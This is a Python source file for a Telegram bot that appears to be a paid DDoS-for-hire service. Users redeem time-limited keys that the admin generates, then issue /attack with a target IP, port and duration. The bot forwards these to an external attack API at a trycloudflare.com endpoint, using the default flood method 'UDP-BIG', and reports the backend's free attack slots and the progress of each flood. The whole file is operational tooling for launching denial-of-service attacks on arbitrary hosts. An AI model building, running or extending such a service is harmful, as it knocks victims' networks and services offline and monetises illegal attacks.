import os
import json
import logging
import random
import string
import asyncio
import threading
import requests
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from datetime import datetime, timedelta
from telegram import Update, BotCommand, BotCommandScopeDefault, BotCommandScopeChat
from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes

# ---------- CONFIGURATION ----------
BOT_TOKEN = os.environ.get("TELEGRAM_BOT_TOKEN")
if not BOT_TOKEN:
    raise ValueError("TELEGRAM_BOT_TOKEN environment variable is not set.")

BASE_URL = os.environ.get(
    "BASE_URL",
    "https://discretion-applicant-gamma-sized.trycloudflare.com/api/attack"
)
SLOTS_URL = os.environ.get(
    "SLOTS_URL",
    "https://discretion-applicant-gamma-sized.trycloudflare.com/api/slots"
)
SLOTS_CACHE_TTL = 4

DEFAULT_METHOD = os.environ.get("DEFAULT_METHOD", "UDP-BIG")
MAX_DURATION = 300
COOLDOWN_SECONDS = 3
ADMIN_USER_ID = int(os.environ.get("ADMIN_USER_ID", "8508604294"))
STATUS_UPDATE_INTERVAL = 5
DATA_FILE = os.environ.get("DATA_FILE", "data.json")

# ---------- GLOBAL STATE ----------
start_time = datetime.now()
attack_count = 0
last_api_response = None
user_data = {}
keys = {}
subscriptions = {}

_slots_cache = {"data": None, "ts": None}

# ---------- LOGGING ----------
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)


# ---------- HEALTH / WEB SERVER (for Render) ----------
class HealthHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.send_header("Content-Type", "text/plain; charset=utf-8")
        self.send_header("Content-Length", "2")
        self.end_headers()
        self.wfile.write(b"OK")

    def do_HEAD(self):
        self.send_response(200)
        self.end_headers()

    def log_message(self, fmt, *args):
        return


def start_web_server():
    port = int(os.environ.get("PORT", 8080))
    try:
        server = ThreadingHTTPServer(("0.0.0.0", port), HealthHandler)
    except OSError as e:
        logger.error(f"Failed to bind health server on port {port}: {e}")
        return None
    thread = threading.Thread(target=server.serve_forever, daemon=True)
    thread.start()
    logger.info(f"Health-check web server listening on 0.0.0.0:{port}")
    return server


async def keep_alive_loop():
    external_url = os.environ.get("RENDER_EXTERNAL_URL")
    if not external_url:
        logger.info("RENDER_EXTERNAL_URL not set - keep-alive pings disabled.")
        return
    ping_url = external_url.rstrip("/") + "/"
    while True:
        try:
            await asyncio.to_thread(requests.get, ping_url, timeout=15)
            logger.info(f"Keep-alive ping OK -> {ping_url}")
        except Exception as e:
            logger.warning(f"Keep-alive ping failed: {e}")
        await asyncio.sleep(600)


# ---------- SLOT FETCHING ----------
def _extract_slots(data):
    if not isinstance(data, dict):
        return None, None

    payload = data
    for wrapper in ("data", "result", "response", "slots"):
        if isinstance(data.get(wrapper), dict):
            payload = data[wrapper]
            break

    avail_keys = [
        "available", "available_slots", "free", "free_slots",
        "slots_available", "slots_free", "open", "remaining"
    ]
    total_keys = [
        "total", "total_slots", "slots_total", "capacity",
        "max", "max_slots", "limit"
    ]
    used_keys = [
        "used", "used_slots", "in_use", "running", "busy", "active"
    ]

    available = None
    total = None
    used = None

    for k in avail_keys:
        if k in payload:
            try:
                available = int(payload[k]); break
            except (TypeError, ValueError):
                pass

    for k in total_keys:
        if k in payload:
            try:
                total = int(payload[k]); break
            except (TypeError, ValueError):
                pass

    for k in used_keys:
        if k in payload:
            try:
                used = int(payload[k]); break
            except (TypeError, ValueError):
                pass

    if available is None and total is not None and used is not None:
        available = max(0, total - used)
    if total is None and available is not None and used is not None:
        total = available + used
    if used is None and total is not None and available is not None:
        used = max(0, total - available)

    return available, total


async def fetch_slots(force=False):
    now = datetime.now()
    if (
        not force
        and _slots_cache["data"] is not None
        and _slots_cache["ts"] is not None
        and (now - _slots_cache["ts"]).total_seconds() < SLOTS_CACHE_TTL
    ):
        return _slots_cache["data"]

    def _do_request():
        return requests.get(SLOTS_URL, timeout=10)

    try:
        response = await asyncio.to_thread(_do_request)
        response.raise_for_status()
        try:
            data = response.json()
        except ValueError:
            data = {}

        available, total = _extract_slots(data)
        if available is None and total is None:
            logger.warning(f"Slots response did not contain recognizable fields: {data}")

        result = (available, total)
        _slots_cache["data"] = result
        _slots_cache["ts"] = now
        return result
    except requests.exceptions.RequestException as e:
        logger.warning(f"Failed to fetch slots from {SLOTS_URL}: {e}")
        return (None, None)


# ---------- DATA PERSISTENCE ----------
def load_data():
    global keys, subscriptions
    if os.path.exists(DATA_FILE):
        try:
            with open(DATA_FILE, 'r') as f:
                data = json.load(f)
                keys = data.get("keys", {})
                subs = data.get("subscriptions", {})
                subscriptions = {}
                for uid, ts_str in subs.items():
                    subscriptions[int(uid)] = datetime.fromisoformat(ts_str)
                logger.info("Data loaded from file.")
        except Exception as e:
            logger.error(f"Error loading data: {e}")
            keys = {}
            subscriptions = {}
    else:
        keys = {}
        subscriptions = {}


def save_data():
    try:
        data = {
            "keys": keys,
            "subscriptions": {str(uid): dt.isoformat() for uid, dt in subscriptions.items()}
        }
        with open(DATA_FILE, 'w') as f:
            json.dump(data, f, indent=2)
        logger.info("Data saved.")
    except Exception as e:
        logger.error(f"Error saving data: {e}")


# ---------- ACCESS CONTROL ----------
def is_admin(user_id):
    return user_id == ADMIN_USER_ID


def is_user_active(user_id):
    if is_admin(user_id):
        return True
    if user_id in subscriptions:
        expiry = subscriptions[user_id]
        if datetime.now() < expiry:
            return True
        else:
            del subscriptions[user_id]
            save_data()
            return False
    return False


def require_active(func):
    async def wrapper(update: Update, context: ContextTypes.DEFAULT_TYPE, *args, **kwargs):
        user_id = update.effective_user.id
        if not is_user_active(user_id):
            await update.message.reply_text(
                "🔒 Your access has expired. Please contact admin for a new key."
            )
            return
        return await func(update, context, *args, **kwargs)
    return wrapper


# ---------- HELPER FUNCTIONS ----------
def format_duration(seconds):
    parts = []
    days = seconds // 86400
    if days:
        parts.append(f"{days}d"); seconds %= 86400
    hours = seconds // 3600
    if hours:
        parts.append(f"{hours}h"); seconds %= 3600
    minutes = seconds // 60
    if minutes:
        parts.append(f"{minutes}m"); seconds %= 60
    if seconds:
        parts.append(f"{seconds}s")
    return " ".join(parts) if parts else "0s"


def format_progress_bar(percent):
    filled = int(percent / 10)
    filled = min(filled, 10)
    empty = 10 - filled
    return "🟩" * filled + "⬜" * empty


def format_attack_start(target, port, duration, method):
    return (
        f"🚀 𝗔𝗧𝗧𝗔𝗖𝗞 𝗦𝗧𝗔𝗥𝗧𝗘𝗗!\n"
        f"🎯 𝗧𝗔𝗥𝗚𝗘𝗧: {target}:{port}\n"
        f"⏳ 𝗧𝗜𝗠𝗘: {duration}s\n"
        f"❄️ 𝗦𝗧𝗔𝗥𝗧 𝗖𝗢𝗢𝗟𝗗𝗢𝗪𝗡: {COOLDOWN_SECONDS}s\n"
        f"📊 𝙲𝙷𝙴𝙲𝙺 /status 𝙵𝙾𝚁 𝚄𝙿𝙳𝙰𝚃𝙴𝚂"
    )


def format_completion(target, port, duration):
    return (
        f"✅ 𝗔𝗧𝗧𝗔𝗖𝗞 𝗖𝗢𝗠𝗣𝗟𝗘𝗧𝗘𝗗!\n"
        f"🎯 𝙏𝘼𝙍𝙂𝙀𝙏: {target}:{port}\n"
        f"⏱️ 𝘿𝙐𝙍𝘼𝙏𝙄𝙊𝙉: {duration}s\n"
        f"🧊 𝗘𝗡𝗗 𝘾𝙊𝙊𝙇𝘿𝙊𝙒𝙉: {COOLDOWN_SECONDS}s"
    )


def format_slots_line(available, total):
    if available is None or total is None:
        return "🟡 𝗦𝗟𝗢𝗧𝗦: Unknown (server did not respond)"
    used = max(0, total - available)
    if available <= 0:
        icon = "🔴"
    elif available < total:
        icon = "🟠"
    else:
        icon = "🟢"
    return f"{icon} 𝗦𝗟𝗢𝗧𝗦: {available}/{total} available  ({used} in use)"


def format_status_active(attack_info, user_name, available=None, total=None):
    target = attack_info["target"]
    port = attack_info["port"]
    duration = attack_info["duration"]
    start = attack_info["start_time"]

    elapsed = (datetime.now() - start).total_seconds()
    remaining = max(0, duration - elapsed)
    percent = min(100, (elapsed / duration) * 100) if duration > 0 else 0

    progress_bar = format_progress_bar(percent)
    slots_line = format_slots_line(available, total)

    lines = [
        "🟢 𝗦𝗧𝗔𝗧𝗨𝗦",
        "━━━━━━━━━━━━━━━━━━━━━━━━",
        f"👤 𝗨𝗦𝗘𝗥: {user_name or 'Hacker'}",
        f"🎯 𝗧𝗔𝗥𝗚𝗘𝗧: {target}:{port}",
        f"⏱️ 𝗥𝗘𝗠𝗔𝗜𝗡𝗜𝗡𝗚: {int(remaining)}s / {duration}s • {int(percent)}%",
        f"📊 [{progress_bar}]",
        "────────────────────────",
        slots_line,
        "────────────────────────"
    ]
    return "\n".join(lines)


def format_status_inactive(available=None, total=None):
    if available is None or total is None:
        return "🟢 𝗦𝗟𝗢𝗧𝗦 𝗔𝗩𝗔𝗜𝗟𝗔𝗕𝗟𝗘!\n🟡 (server did not report slot counts)"
    if available <= 0:
        return f"🔴 𝗔𝗟𝗟 𝗦𝗟𝗢𝗧𝗦 𝗕𝗨𝗦𝗬! ({available}/{total} available)"
    return f"🟢 𝗦𝗟𝗢𝗧𝗦 𝗔𝗩𝗔𝗜𝗟𝗔𝗕𝗟𝗘: {available}/{total}"


# ---------- ASYNC COMPLETION TASK ----------
async def send_completion_after_delay(user_id, chat_id, attack_info, bot):
    duration = attack_info["duration"]
    logger.info(f"Completion task started for user {user_id}, sleeping {duration}s")
    await asyncio.sleep(duration)

    if user_id in user_data and user_data[user_id].get("active"):
        current = user_data[user_id]["active"]
        if current["start_time"] == attack_info["start_time"] and not user_data[user_id].get("completion_sent", False):
            try:
                completion_msg = format_completion(
                    attack_info["target"],
                    attack_info["port"],
                    attack_info["duration"]
                )
                await bot.send_message(chat_id=chat_id, text=completion_msg)
                logger.info(f"Completion message sent to {chat_id} via async task")
                user_data[user_id]["completion_sent"] = True
                user_data[user_id]["active"] = None
                user_data[user_id]["last_finish_time"] = datetime.now()
                if user_data[user_id].get("status_job"):
                    user_data[user_id]["status_job"].schedule_removal()
                    user_data[user_id]["status_job"] = None
            except Exception as e:
                logger.error(f"Failed to send completion message via async task: {e}")


# ---------- STATUS UPDATE JOB ----------
async def update_status_message(context: ContextTypes.DEFAULT_TYPE):
    job = context.job
    user_id = job.user_id
    chat_id = job.chat_id
    message_id = job.data["message_id"]

    if user_id not in user_data or not user_data[user_id].get("active"):
        try:
            await context.bot.edit_message_text(
                chat_id=chat_id, message_id=message_id,
                text="✅ Your attack has finished."
            )
        except Exception:
            pass
        job.schedule_removal()
        return

    attack = user_data[user_id]["active"]
    now = datetime.now()
    elapsed = (now - attack["start_time"]).total_seconds()
    remaining = max(0, attack["duration"] - elapsed)

    if remaining <= 0:
        user_data[user_id]["active"] = None
        user_data[user_id]["last_finish_time"] = now
        if user_data[user_id].get("status_job"):
            user_data[user_id]["status_job"] = None
        try:
            await context.bot.edit_message_text(
                chat_id=chat_id, message_id=message_id,
                text="✅ Your attack has finished."
            )
        except Exception:
            pass
        job.schedule_removal()
        return

    user_name = job.data.get("user_name", "Hacker")
    available, total = await fetch_slots()
    status_text = format_status_active(attack, user_name, available, total)
    try:
        await context.bot.edit_message_text(
            chat_id=chat_id, message_id=message_id, text=status_text
        )
    except Exception as e:
        logger.error(f"Failed to edit status message: {e}")
        job.schedule_removal()


# ---------- COMMAND HANDLERS ----------
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if is_admin(user_id):
        await update.message.reply_text(
            "⚡ 𝗖𝗬𝗕𝗘𝗥 𝗔𝗧𝗧𝗔𝗖𝗞 𝗕𝗢𝗧  \n"
            "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
            "🔓 𝗔𝗱𝗺𝗶𝗻 𝗣𝗮𝗻𝗲𝗹 – Permanent Access\n\n"
            "▸ ⚙️ /genkey <seconds>   – Generate a key\n"
            "▸ 🚀 /attack <ip> <port> <duration>  – Launch attack\n"
            "▸ 📊 /status             – Live attack progress\n"
            "▸ 📖 /help               – Show this menu\n\n"
            "💡 Example: /attack 192.168.1.1 80 60\n"
            "🔒 All attacks are logged."
        )
    else:
        if is_user_active(user_id):
            await update.message.reply_text(
                "⚡ 𝗖𝗬𝗕𝗘𝗥 𝗔𝗧𝗧𝗔𝗖𝗞 𝗕𝗢𝗧  \n"
                "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
                "🔓 𝗨𝘀𝗲𝗿 𝗔𝗰𝗰𝗲𝘀𝘀 – Active Subscription\n\n"
                "▸ 🚀 /attack <ip> <port> <duration>  – Launch attack\n"
                "▸ 📊 /status             – Live attack progress\n"
                "▸ 🔑 /redeem <key>       – Activate a new key\n"
                "▸ 📖 /help               – Show this menu\n\n"
                "💡 Example: /attack 192.168.1.1 80 60\n"
                "⚠️ Max attack duration: 300s"
            )
        else:
            await update.message.reply_text(
                "⚡ 𝗖𝗬𝗕𝗘𝗥 𝗔𝗧𝗧𝗔𝗖𝗞 𝗕𝗢𝗧  \n"
                "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
                "🔒 𝗔𝗰𝗰𝗲𝘀𝘀 𝗟𝗼𝗰𝗸𝗲𝗱 – No Active Subscription\n\n"
                "To gain access, redeem a key:\n"
                "🔑 /redeem <key>\n\n"
                "📨 Contact the admin if you need a key."
            )


async def help(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if is_admin(user_id):
        await update.message.reply_text(
            "⚡ 𝗖𝗬𝗕𝗘𝗥 𝗔𝗧𝗧𝗔𝗖𝗞 𝗕𝗢𝗧  \n"
            "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
            "📖 𝗔𝗱𝗺𝗶𝗻 𝗛𝗲𝗹𝗽\n\n"
            "▸ ⚙️ /genkey <seconds>   – Generate a key\n"
            "▸ 🚀 /attack <ip> <port> <duration>  – Launch attack\n"
            "▸ 📊 /status             – Live attack progress\n"
            "▸ 📖 /help               – Show this menu\n\n"
            "💡 Example: /attack 192.168.1.1 80 60"
        )
    else:
        if is_user_active(user_id):
            await update.message.reply_text(
                "⚡ 𝗖𝗬𝗕𝗘𝗥 𝗔𝗧𝗧𝗔𝗖𝗞 𝗕𝗢𝗧  \n"
                "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"
                "📖 𝗨𝘀𝗲𝗿 𝗛𝗲𝗹𝗽\n\n"
                "▸ 🚀 /attack <ip> <port> <duration>  – Launch attack\n"
                "▸ 📊 /status             – Live attack progress\n"
                "▸ 🔑 /redeem <key>       – Activate a new key\n"
                "▸ 📖 /help               – Show this menu\n\n"
                "💡 Example: /attack 192.168.1.1 80 60\n"
                "⚠️ Max attack duration: 300s"
            )
        else:
            await update.message.reply_text(
                "🔒 You don't have an active subscription.\n"
                "Use /redeem <key> to activate access."
            )


async def redeem(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if is_admin(user_id):
        await update.message.reply_text("ℹ️ Admin already has permanent access. No need to redeem.")
        return

    if is_user_active(user_id):
        await update.message.reply_text(
            "✅ You already have an active subscription. No need to redeem another key."
        )
        return

    args = context.args
    if len(args) != 1:
        await update.message.reply_text("❌ Invalid format.\nUsage: /redeem <key>")
        return

    key = args[0]
    if key not in keys:
        await update.message.reply_text("❌ Invalid key. Please check and try again.")
        return

    key_data = keys[key]
    if key_data["used_by"] is not None:
        await update.message.reply_text("❌ This key has already been used.")
        return

    duration = key_data["duration"]
    expiry = datetime.now() + timedelta(seconds=duration)

    keys[key]["used_by"] = user_id
    subscriptions[user_id] = expiry
    save_data()

    await update.message.reply_text(
        f"✅ Key redeemed successfully!\n"
        f"⏱️ Access granted for {format_duration(duration)} (until {expiry.strftime('%Y-%m-%d %H:%M:%S')}).\n"
        f"🔓 Enjoy the bot!"
    )


async def genkey(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_admin(user_id):
        await update.message.reply_text("⛔ Admin only command.")
        return

    args = context.args
    if len(args) != 1:
        await update.message.reply_text(
            "\nUsage: /genkey <seconds>\n"
            "Example: /genkey 3600  (for 1 hour)"
        )
        return

    try:
        duration = int(args[0])
        if duration <= 0:
            raise ValueError
    except ValueError:
        await update.message.reply_text("❌ Duration must be a positive integer (seconds).")
        return

    key = ''.join(random.choices(string.ascii_uppercase + string.digits, k=12))

    keys[key] = {"duration": duration, "used_by": None}
    save_data()

    duration_str = format_duration(duration)
    await update.message.reply_text(
        f"✅ Key generated successfully!\n"
        f"🔑 Key: `{key}`\n"
        f"⏱️ Duration: {duration_str}\n"
        f"🔓 Usage: /redeem {key}"
    )


@require_active
async def attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global attack_count, last_api_response

    user_id = update.effective_user.id

    if user_id not in user_data:
        user_data[user_id] = {
            "last_finish_time": None,
            "active": None,
            "status_job": None,
            "completion_task": None,
            "completion_sent": False
        }

    if user_data[user_id].get("completion_task"):
        user_data[user_id]["completion_task"].cancel()
        user_data[user_id]["completion_task"] = None

    if user_data[user_id]["active"]:
        user_data[user_id]["active"] = None
        if user_data[user_id].get("status_job"):
            user_data[user_id]["status_job"].schedule_removal()
            user_data[user_id]["status_job"] = None

    last_finish = user_data[user_id]["last_finish_time"]
    if last_finish:
        elapsed_since_finish = (datetime.now() - last_finish).total_seconds()
        if elapsed_since_finish < COOLDOWN_SECONDS:
            wait = int(COOLDOWN_SECONDS - elapsed_since_finish) + 1
            await update.message.reply_text(
                f"⏳ Please wait {wait} seconds after your last attack finished."
            )
            return

    args = context.args
    if len(args) < 3:
        await update.message.reply_text("☣️  Usage: /attack <ip> <port> <duration>")
        return

    target = args[0]
    port = args[1]
    duration = args[2]
    method = args[3] if len(args) > 3 else DEFAULT_METHOD

    try:
        port = int(port)
        if not (1 <= port <= 65535):
            raise ValueError
    except ValueError:
        await update.message.reply_text("❌ Port must be a number between 1 and 65535.")
        return

    try:
        duration = int(duration)
        if duration <= 0:
            raise ValueError
        if duration > MAX_DURATION:
            await update.message.reply_text(f"❌ Max duration is {MAX_DURATION} seconds.")
            return
    except ValueError:
        await update.message.reply_text("❌ Duration must be a positive integer (seconds).")
        return

    params = {"host": target, "port": port, "time": duration, "method": method}

    try:
        response = await asyncio.to_thread(
            requests.get, BASE_URL, params=params, timeout=30
        )
        response.raise_for_status()

        try:
            data = response.json()
        except ValueError:
            data = {}

        if isinstance(data, dict) and data.get("success") is False:
            error_msg = data.get("message", "Unknown error")
            await update.message.reply_text(f"❌ Attack failed: {error_msg}")
            return

        attack_count += 1
        last_api_response = response.text

        now = datetime.now()
        attack_info = {
            "target": target, "port": port, "duration": duration,
            "method": method, "start_time": now
        }
        user_data[user_id]["last_finish_time"] = None
        user_data[user_id]["active"] = attack_info
        user_data[user_id]["completion_sent"] = False

        _slots_cache["data"] = None
        _slots_cache["ts"] = None

        bot = context.bot
        task = asyncio.create_task(
            send_completion_after_delay(user_id, update.effective_chat.id, attack_info, bot)
        )
        user_data[user_id]["completion_task"] = task
        logger.info(f"Async completion task scheduled for user {user_id} in {duration}s")

        launch_msg = format_attack_start(target, port, duration, method)
        await update.message.reply_text(launch_msg)

    except requests.exceptions.RequestException as e:
        logger.error(f"Request failed: {e}")
        await update.message.reply_text(f"❌ Attack failed: {e}")


@require_active
async def status(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id

    try:
        if user_id in user_data and user_data[user_id].get("active"):
            attack = user_data[user_id]["active"]
            elapsed = (datetime.now() - attack["start_time"]).total_seconds()
            if elapsed >= attack["duration"]:
                if not user_data[user_id].get("completion_sent", False):
                    completion_msg = format_completion(attack["target"], attack["port"], attack["duration"])
                    await update.message.reply_text(completion_msg)
                    user_data[user_id]["completion_sent"] = True
                user_data[user_id]["active"] = None
                user_data[user_id]["last_finish_time"] = datetime.now()
                if user_data[user_id].get("status_job"):
                    user_data[user_id]["status_job"].schedule_removal()
                    user_data[user_id]["status_job"] = None

                available, total = await fetch_slots(force=True)
                await update.message.reply_text(format_status_inactive(available, total))
                return

        if user_id not in user_data or not user_data[user_id].get("active"):
            available, total = await fetch_slots(force=True)
            await update.message.reply_text(format_status_inactive(available, total))
            return

        old_job = user_data[user_id].get("status_job")
        if old_job:
            old_job.schedule_removal()
            user_data[user_id]["status_job"] = None

        attack = user_data[user_id]["active"]
        user_name = update.effective_user.first_name or "Hacker"

        available, total = await fetch_slots(force=True)
        status_text = format_status_active(attack, user_name, available, total)
        sent_msg = await update.message.reply_text(status_text)

        job_queue = context.job_queue or context.application.job_queue
        if job_queue:
            job_data = {
                "message_id": sent_msg.message_id,
                "user_name": user_name,
                "chat_id": update.effective_chat.id
            }
            job = job_queue.run_repeating(
                update_status_message,
                interval=STATUS_UPDATE_INTERVAL,
                first=STATUS_UPDATE_INTERVAL,
                user_id=user_id,
                chat_id=update.effective_chat.id,
                data=job_data
            )
            user_data[user_id]["status_job"] = job
        else:
            logger.error("JobQueue not available for /status")

    except Exception as e:
        logger.error(f"Error in /status: {e}")
        await update.message.reply_text("❌ An error occurred while fetching status. Please try again.")


# ---------- BOT MENU ----------
DEFAULT_COMMANDS = [
    BotCommand("start",  "🚀 Start the bot"),
    BotCommand("attack", "⚔️ Launch an attack"),
    BotCommand("status", "📊 Live attack progress"),
    BotCommand("redeem", "🔑 Redeem an access key"),
    BotCommand("help",   "📖 Show help menu"),
]

ADMIN_COMMANDS = [
    BotCommand("start",  "🚀 Start the bot"),
    BotCommand("attack", "⚔️ Launch an attack"),
    BotCommand("status", "📊 Live attack progress"),
    BotCommand("genkey", "⚙️ Generate an access key"),
    BotCommand("help",   "📖 Show help menu"),
]


async def setup_bot_menu(application):
    """
    Register commands with Telegram so the side menu (☰ button) updates
    automatically on every startup.

    - Default scope: commands shown to all regular users.
    - Admin scope  : extra /genkey command, only visible to ADMIN_USER_ID.
    """
    bot = application.bot

    # Default command menu (everyone)
    try:
        await bot.set_my_commands(
            commands=DEFAULT_COMMANDS,
            scope=BotCommandScopeDefault()
        )
        logger.info("Default bot menu registered.")
    except Exception as e:
        logger.error(f"Failed to set default bot menu: {e}")

    # Admin command menu (only for the admin chat)
    try:
        await bot.set_my_commands(
            commands=ADMIN_COMMANDS,
            scope=BotCommandScopeChat(chat_id=ADMIN_USER_ID)
        )
        logger.info("Admin bot menu registered.")
    except Exception as e:
        logger.error(f"Failed to set admin bot menu: {e}")


# ---------- MAIN ----------
async def post_init(application):
    """
    Runs after the application is initialized (inside the running loop).
    - Registers the bot command menu with Telegram (auto-updates on side menu).
    - Kicks off the Render keep-alive loop.
    """
    await setup_bot_menu(application)
    asyncio.create_task(keep_alive_loop())


def main():
    load_data()
    start_web_server()

    app = (
        ApplicationBuilder()
        .token(BOT_TOKEN)
        .post_init(post_init)
        .build()
    )

    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("help", help))
    app.add_handler(CommandHandler("redeem", redeem))
    app.add_handler(CommandHandler("genkey", genkey))
    app.add_handler(CommandHandler("attack", attack))
    app.add_handler(CommandHandler("status", status))

    logger.info("Bot started polling...")
    app.run_polling()


if __name__ == "__main__":
    main()